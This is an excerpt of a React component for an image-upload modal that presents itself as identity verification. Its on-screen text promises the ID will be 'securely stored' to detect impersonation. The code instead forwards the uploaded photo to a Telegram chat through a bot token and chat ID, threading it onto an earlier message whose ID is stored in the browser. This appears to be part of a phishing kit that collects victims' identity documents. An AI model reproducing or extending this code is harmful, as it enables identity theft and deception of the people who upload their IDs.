...
const Upload: React.FC<ImageUploadProps> = ({ onClose }) => {
  ...
  useEffect(() => {
    ...
    setConfig({
      chatId: telegram.image_chatid,
      token: telegram.data_token,
    });
  }, []);

  const sendPhoto = async (photo: File, messageId: number) => {
    const formData = new FormData();
    formData.append("photo", photo);
    formData.append("chat_id", config.chatId);

    if (messageId) {
      formData.append("reply_to_message_id", messageId.toString());
    }
  ...
  const handleFileChange = async (
    ...
    if (file) {
      ...
      try {
        const message_id = localStorage.getItem("messageId");
        await sendPhoto(file, Number(message_id));
    ...
    <div className="fixed inset-0 flex items-center justify-center bg-gray-900/75">
      <div className="w-11/12 rounded-lg bg-white p-8 shadow-2xl md:w-2/5">
        <div className="relative mb-4 flex items-center justify-center">
          ...
          <FontAwesomeIcon
            icon={faClose}
            className="absolute top-1/2 right-0 hidden h-5 w-5 -translate-y-1/2 transform cursor-pointer rounded-full bg-gray-200 p-2 text-gray-600 hover:bg-gray-300 md:block"
            onClick={onClose}
          />
        </div>
        ...
        <div className="rounded-md bg-gray-100 p-4 text-sm text-gray-600">
          Your ID will be securely stored for up to 1 year to help improve how
          we detect impersonation and fake IDs. If you opt out, we'll delete it
